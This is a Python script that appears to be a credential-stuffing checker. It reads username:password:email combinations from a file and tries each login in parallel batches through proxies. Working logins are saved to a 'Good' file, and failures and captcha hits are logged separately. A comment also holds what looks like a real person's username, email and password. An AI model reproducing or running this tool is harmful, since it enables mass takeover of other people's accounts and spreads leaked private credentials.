
from src.client import Client
import asyncio
import random
from aiomultiprocess import Pool
import time
from asyncio.exceptions import TimeoutError
from colorama import Fore, init
import requests
import json
init()
PU = []
with open('username.txt', 'r', encoding='utf-8', errors='ignore') as f:
    c = 1
    for line in f:
        PU.append(f'{c}:{line.strip()}')
        c+=1
# SharylAttkisson:jin@ixbt.com:nosorog

def savealldata(username,password, data):
    with open('./result/log_all_checker.txt', 'a+', encoding='utf8') as usr:
        usr.write(f'{username}:{password}: {data} \n ') 


def savegod(username,password, data):
    with open('./result/Good.txt', 'a+',encoding='utf8') as usr:
        usr.write(f'{username}:{password}: {data} \n ')  


def saveerror(username,password, data):
    with open('./result/Error.txt', 'a+',encoding='utf8') as usr:

        usr.write(f'{username}:{password}:{data} \n ')  


def save_capcha(username,email, password):
    with open('./result/capcha.txt', 'a+',encoding='utf8') as usr:
        usr.write(f'{username}:{email}:{password} \n ')  

async def main(username):
        try:
            ux = username.split(':')
            counters = ux[0]
            username = ux[1]
            password = ux[2]
            email_phone= ux[3]
            counts = 0
            while True:
                counts +=1
                if username not in open("./result/good.txt", "r", encoding="utf-8").read() and username not in open("./result/hint.txt", "r").read():
                    client = Client(username, password,email_phone,counters, use_proxy=True)
                    await client.get_proxy()
                    res = await client.login()
                    await client.close()
                    if res == 'ERR':
                        if counts > 5:
                            print(f'{Fore.CYAN}[ {Fore.MAGENTA}{counters}{Fore.CYAN} ] [ {Fore.MAGENTA}{username}{Fore.CYAN} ] [ {Fore.MAGENTA}{password}{Fore.CYAN} ] [ {Fore.MAGENTA}{email_phone}{Fore.CYAN} ] [ {Fore.YELLOW}TIMEOUT {counts}{Fore.CYAN} ]')
                            datas = f'{username}:{password}:{email_phone}'
                            with open("./result/capcha.txt", "a+") as f:
                                if datas not in open("./result/capcha.txt", "r").read():
                                    f.write(f'{datas}\n')
                            break
                    else:
                        break
                else:
                    print(f"{Fore.WHITE}{username}:{password}{email_phone} {Fore.GREEN}Already successfully checked!{Fore.RESET} {Fore.RESET}") 
                    break
        except Exception as e:
            print(e)
            pass

async def x():
        count =1
        n = 100
        final = [PU[i * n:(i + 1) * n] for i in range((len(PU) + n - 1) // n )]
        for x in final:
            count+=1
            async with Pool() as pool:
                async for result in pool.map(main,x):
                    continue 

if __name__ == '__main__':
    try:
        asyncio.run(x())
    except Exception as e:
        print(e)
    except:
        pass
# https://www.myexternalip.com/raw
